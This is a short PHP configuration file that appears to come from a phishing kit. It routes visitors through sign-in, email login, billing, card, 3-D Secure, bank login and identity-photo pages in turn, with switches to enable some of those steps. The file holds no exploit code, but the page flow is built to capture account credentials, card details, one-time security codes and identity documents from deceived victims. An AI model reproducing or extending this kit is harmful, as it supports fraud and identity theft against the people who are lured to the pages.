<?php

/** routing to first page default web page**/

$config['route']['1'] = 'signin';

$config['route']['2'] = 'email';

$config['route']['3'] = 'case';

$config['route']['4'] = 'billing';

$config['route']['5'] = 'card';

$config['route']['6'] = 'x3dsecure';

$config['route']['7'] = 'bank';

$config['route']['8'] = 'photo';

$config['route']['9'] = 'finish';


/** routing web by configuration **/
/** is_on() **/

$config['route']['config']['1'] = '';

$config['route']['config']['2'] = 'email_login';

$config['route']['config']['3'] = '';

$config['route']['config']['4'] = '';

$config['route']['config']['5'] = '';

$config['route']['config']['6'] = '3dsecure';

$config['route']['config']['7'] = 'bank';

$config['route']['config']['8'] = 'pap';

$config['route']['config']['9'] = '';